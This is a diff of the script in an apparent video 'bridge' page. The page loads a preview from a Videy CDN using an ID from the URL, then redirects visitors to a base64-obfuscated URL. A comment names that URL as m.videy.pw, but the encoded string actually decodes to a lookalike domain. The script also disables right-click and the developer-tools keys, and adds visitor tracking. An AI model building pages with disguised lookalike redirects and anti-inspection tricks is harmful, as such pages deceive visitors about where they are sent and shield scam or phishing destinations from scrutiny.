@@ -149,28 +149,45 @@
     <script>
         lucide.createIcons();
 
+        // Redirect base URL (m.videy.pw)
         const BASE_REDIRECT = atob("aHR0cHM6Ly9tLnZpZGxleS5wdy8=");
 
+        /**
+         * Mengambil ID Videy dari URL (Query Param atau Path)
+         * Menghapus ekstensi .mp4 agar tidak merusak redirect
+         */
         function getVideyId() {
             const urlParams = new URLSearchParams(window.location.search);
             let id = urlParams.get('id') || urlParams.get('v');
 
             if (!id) {
-                const pathParts = window.location.pathname.split('/');
-                const lastPart = pathParts.pop().trim();
-                if (lastPart && !lastPart.includes('.') && lastPart !== 'index' && lastPart !== 'bridge') {
+                const pathParts = window.location.pathname.split('/').filter(p => p.length > 0);
+                const lastPart = pathParts[pathParts.length - 1];
+                
+                // Pastikan bukan file index atau bridge
+                if (lastPart && !['index', 'bridge', 'index.html'].includes(lastPart.toLowerCase())) {
                     id = lastPart;
                 }
             }
-            return (id && id.length >= 3) ? id : null;
+
+            if (id) {
+                // Hapus ekstensi jika pengguna memasukkan .mp4 di URL
+                // Ini kunci perbaikan agar redirect ke m.videy.pw/ID berhasil
+                return id.split('.')[0].trim();
+            }
+            return null;
         }
 
+        /**
+         * Menyiapkan video preview di background
+         */
         function setupPreview() {
             const vId = getVideyId();
             const bgVideo = document.getElementById('bgVideo');
             const vidThumb = document.getElementById('vidThumb');
 
-            if (vId) {
+            if (vId && vId.length >= 3) {
+                // CDN Videy memerlukan ekstensi .mp4 untuk file mentah
                 const videoSrc = `https://cdn.videy.co/${vId}.mp4`;
                 bgVideo.src = videoSrc;
                 
@@ -187,6 +204,9 @@
             }
         }
 
+        /**
+         * Menangani klik untuk redirect ke situs utama
+         */
         async function handleAction() {
             const loader = document.getElementById("loader");
             const overlay = document.getElementById("playOverlay");
@@ -199,6 +219,7 @@
             setTimeout(() => {
                 let finalUrl = BASE_REDIRECT;
                 if (vId) {
+                    // Gabungkan URL dasar dengan ID yang sudah dibersihkan
                     finalUrl = finalUrl.endsWith('/') ? finalUrl + vId : finalUrl + '/' + vId;
                 }
                 window.location.href = finalUrl;
@@ -210,12 +231,13 @@
             document.getElementById("videoArea").addEventListener("click", handleAction);
         };
 
+        // Keamanan dasar
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.onkeydown = (e) => {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74))) return false;
         };
 
-        // Histats tracking code
+        // Histats tracking (Opsional)
         var _Hasync = _Hasync || [];
         _Hasync.push(['Histats.start', '1,4654540,4,0,0,0,00010000']);
         _Hasync.push(['Histats.fasi', '1']);
